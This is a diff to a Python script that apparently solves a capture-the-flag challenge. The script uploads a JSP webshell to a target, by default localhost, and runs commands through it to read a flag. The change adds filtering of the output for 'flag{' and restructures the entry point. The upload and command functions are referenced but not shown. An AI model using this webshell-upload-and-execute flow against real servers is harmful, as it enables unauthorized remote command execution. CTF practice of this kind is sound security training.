@@ -2,6 +2,7 @@ import requests
 import sys
 import os
 import urllib.parse
+import re
 
 
 def upload_webshell(url, file_path="webshell.jsp"):
@@ -39,24 +40,23 @@ def read_flag(webshell_url):
     for cmd in commands:
         flag_content = execute_command(webshell_url, cmd)
         if flag_content:
-            print(flag_content)
+            cleaned_content = re.sub(r"명령어 : .*?<br>", "", flag_content)
+            if "flag{" in cleaned_content:
+                print(cleaned_content)
             return flag_content
 
     return None
 
-def main():
-    if len(sys.argv) > 1:
-        target_url = sys.argv[1]
-    else:
-        target_url = "http://127.0.0.1:8080"
 
-    webshell_url = upload_webshell(target_url)
-    if webshell_url:
-        print(f"shell: {webshell_url}")
+if len(sys.argv) > 1:
+    target_url = sys.argv[1]
+else:
+    target_url = "http://127.0.0.1:8080"
 
-    flag = read_flag(webshell_url)
-    if not flag:
-        print("failed")
+webshell_url = upload_webshell(target_url)
+if webshell_url:
+    print("upload success")
 
-if __name__ == "__main__":
-    main()
+flag = read_flag(webshell_url)
+if not flag:
+    print("failed")
